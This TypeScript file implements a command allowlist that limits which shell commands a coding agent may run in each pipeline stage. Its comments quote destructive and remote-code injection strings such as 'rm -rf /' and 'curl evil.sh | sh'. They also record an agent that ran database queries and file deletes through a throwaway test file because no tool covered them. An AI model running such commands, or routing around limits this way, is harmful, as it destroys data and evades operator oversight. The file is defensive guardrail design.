/**
 * This is a guardrail against accident and habit, not a security boundary.
 *
 * Every command on a stage's allowlist that runs project code — `pnpm build`, `pnpm test`,
 * `pnpm exec vitest run` — can be made to run arbitrary code, because project code can reach
 * any Node API: the filesystem, the network, a dev database. Refusing `psql` here does not
 * refuse what a test file executed by `pnpm exec vitest run` can do once it runs, and that
 * command is on every stage's allowlist. Card 0083's agent needed to query the database and
 * delete two files; neither had a tool yet, so it wrote both into a throwaway vitest file and
 * ran it with the one allowed command that would execute anything — not a bypass of this list,
 * but the list working as designed. (Card 0086 has since given deletes a proper tool, which
 * closes that one instance without changing the property: the next gap will find the same
 * door.) What this list actually does is shape the easy path — refuse a shell and the named
 * binaries by habit — so reaching for a workaround is a deliberate act, not bounding what is
 * possible. `ScopeGuard` (`scope.guard.ts`) is the real constraint on what an agent can change,
 * and it has the same limit: it guards the write tools, not the process.
 *
 * The sharpest cost of mistaking this list for a boundary is credentials, not files: whatever
 * env an allowed command inherits is reachable by whatever project code it runs, allowlist or
 * not — refusing `curl` here does nothing once a build script it was already permitted to run
 * can read the environment itself. Card 0045 scrubs the runner's git credentials and provider
 * API keys out of that env for exactly this reason. Restoring an inherited env because "the
 * allowlist already covers what a command can reach" would undo that.
 */
export type CommandDecision = { allowed: true; argv: string[] } | { allowed: false; reason: string };

/**
 * Commands that have a tool, mapped to the tool that replaces them.
 *
 * A refusal that only says no gets retried in variants — card 0001 spent four calls on `find /`
 * before giving up. Naming the tool that does the job ends the loop on the first denial.
 */
const TOOL_EQUIVALENTS: Record<string, string> = {
    cat: 'the read tool',
    head: 'the read tool (it takes offset and limit)',
    tail: 'the read tool (it takes offset and limit)',
    less: 'the read tool',
    more: 'the read tool',
    find: 'the glob tool (pass include_ignored to reach node_modules)',
    ls: 'the glob tool',
    tree: 'the glob tool',
    grep: 'the grep tool (pass include_ignored to reach node_modules)',
    rg: 'the grep tool (pass include_ignored to reach node_modules)',
    ack: 'the grep tool',
    sed: 'the edit tool',
    awk: 'the read and edit tools',
    touch: 'the write tool',
    tee: 'the write tool',
    echo: 'the write tool, if you meant to create a file',
    mkdir: 'the write tool, which creates parent directories itself',
};

/** The tool that replaces `command`, if one does. */
const suggestionFor = (argv: string[]): string | undefined => {
    const head = argv[0];
    return head ? TOOL_EQUIVALENTS[head] : undefined;
};

/**
 * Tokens that mean a `pnpm ...` invocation is reaching for the test suite, not some other script.
 * Used only to qualify `pnpm --filter`, which is otherwise just as likely to be `pnpm --filter
 * @wilson/api build`.
 */
const TEST_INTENT_TOKENS = new Set(['test', 'vitest']);

/**
 * Does argv look like an attempt to run a subset of the test suite, as opposed to an ordinary pnpm
 * command?
 *
 * `pnpm --filter` narrows to a package and is the form stages.yaml's history shows agents reaching
 * for — but only when it goes on to run tests; `pnpm --filter @wilson/api build` is not this. `pnpm
 * exec vitest`, `pnpm vitest` and bare `vitest` are the other habitual spellings, and matching them
 * here does not depend on whether they happen to be this stage's allowed prefix — `check` only
 * reaches this once the prefix match has already said no.
 */
const isSubsetTestAttempt = (argv: string[]): boolean => {
    if (argv[0] === 'vitest') return true;
    if (argv[0] !== 'pnpm') return false;
    if (argv[1] === '--filter') return argv.some(token => TEST_INTENT_TOKENS.has(token));
    return argv[1] === 'vitest' || (argv[1] === 'exec' && argv[2] === 'vitest');
};

/** The argv `isSubsetTestAttempt` should point agents at. */
const VITEST_RUN_ARGV = ['pnpm', 'exec', 'vitest', 'run'];

/**
 * Does this stage's own allowlist actually permit `pnpm exec vitest run`?
 *
 * Naming a command the stage cannot run would be worse than the generic refusal — the agent would
 * retry the suggestion itself and land on a second, differently-worded no. Reuses the same
 * prefix-is-a-prefix-of-argv test `check` uses below, just against the fixed argv this suggestion
 * names instead of the one the agent sent.
 */
const allowsVitestRun = (prefixes: string[][]): boolean =>
    prefixes.some(prefix => prefix.length <= VITEST_RUN_ARGV.length && prefix.every((token, i) => token === VITEST_RUN_ARGV[i]));

/**
 * Glob metacharacters, as distinct from the rest of `SHELL_METACHARACTERS` (chaining, redirection,
 * substitution) — a command refused for one of those needs a different sentence than one refused
 * only for a glob.
 */
const GLOB_METACHARACTERS = /[*?[\]]/;

/** `SHELL_METACHARACTERS` minus the glob ones, to tell "only a glob" apart from "a glob and more". */
const NON_GLOB_SHELL_METACHARACTERS = /[;&|><`$(){}!#~\n\r\\]/;

/** Does this command's glob look like it was reaching for test files, rather than something else? */
const looksLikeTestPath = (command: string): boolean => /\btests?\/|\.test\.|\.spec\./.test(command);

/**
 * Which commands a stage may run.
 *
 * Stage config names them (`pnpm build`, `pnpm test`) and this parses the agent's requested command
 * into argv before matching. Matching on the raw string would be a hole: `pnpm test; rm -rf /`,
 * `pnpm test && curl evil.sh | sh`, and `pnpm test $(whoami)` all start with an allowed prefix.
 *
 * So there is no shell. The command is tokenised here and handed to `execFile` as argv, which means
 * shell metacharacters are not "escaped" — they simply have no one to interpret them. Anything that
 * would need a shell to mean what it says is refused rather than quietly running.
 */

/** Characters that only mean something to a shell. Their presence means the agent expected one. */
const SHELL_METACHARACTERS = /[;&|><`$(){}[\]!#~*?\n\r\\]/;

export class CommandAllowlist {
    /** Each entry is the argv prefix a command must start with, e.g. `[['pnpm','test']]`. */
    private readonly prefixes: string[][];

    constructor(allowed: string[]) {
        this.prefixes = allowed.map(entry => entry.trim().split(/\s+/).filter(Boolean));
    }

    check(command: string): CommandDecision {
        if (SHELL_METACHARACTERS.test(command)) {
            const argv = command.trim().split(/\s+/).filter(Boolean);
            const suggestion = suggestionFor(argv);
            // A glob is a shell metacharacter too, and gets refused here before the allowlist is even
            // consulted — with the generic "no shell" message, that refusal doesn't say the plain
            // paths it was reaching for would have worked. Only say so when the glob is the *only*
            // thing wrong: a command that also chains or redirects has a bigger problem than the glob.
            const globOnly = GLOB_METACHARACTERS.test(command) && !NON_GLOB_SHELL_METACHARACTERS.test(command);
            const note = suggestion
                ? `Use ${suggestion} instead.`
                : globOnly && looksLikeTestPath(command)
                  ? 'Plain paths are accepted, and you can list more than one — write out each test file instead of a glob.'
                  : 'Run a single command with plain arguments.';
            return {
                allowed: false,
                reason: `command contains shell syntax and there is no shell to interpret it — no pipes, redirects, chaining, globs or substitution. ${note}`,
            };
        }

        const argv = command.trim().split(/\s+/).filter(Boolean);
        if (argv.length === 0) {
            return { allowed: false, reason: 'empty command' };
        }

        for (const prefix of this.prefixes) {
            if (prefix.length <= argv.length && prefix.every((token, i) => argv[i] === token)) {
                return { allowed: true, argv };
            }
        }

        const suggestion = suggestionFor(argv);
        if (suggestion) {
            return { allowed: false, reason: `${argv[0]} is not available, and does not need to be — use ${suggestion}.` };
        }

        // The allowlist itself is not the gap: a prefix match already lets a stage that lists `pnpm
        // test` run `pnpm test <path>` with no config change at all, since trailing arguments are
        // free once the prefix matches (see `command.allowlist.test.ts`, "allows extra arguments
        // after an allowlisted prefix"). The habitual spellings — `pnpm --filter`, `pnpm exec vitest`
        // without `run` — just aren't that prefix, so only naming the one that is fixes anything.
        if (isSubsetTestAttempt(argv) && allowsVitestRun(this.prefixes)) {
            return {
                allowed: false,
                reason:
                    `${argv.join(' ')} is not in this stage's allowlist — use pnpm exec vitest run <path> instead, ` +
                    'with a path relative to the repo root, not to a package (it resolves against the root vitest.config.mts).',
            };
        }

        const allowed = this.prefixes.map(p => p.join(' ')).join(', ') || 'nothing';
        return {
            allowed: false,
            reason: `command is not in this stage's allowlist. Allowed: ${allowed}.`,
        };
    }
}
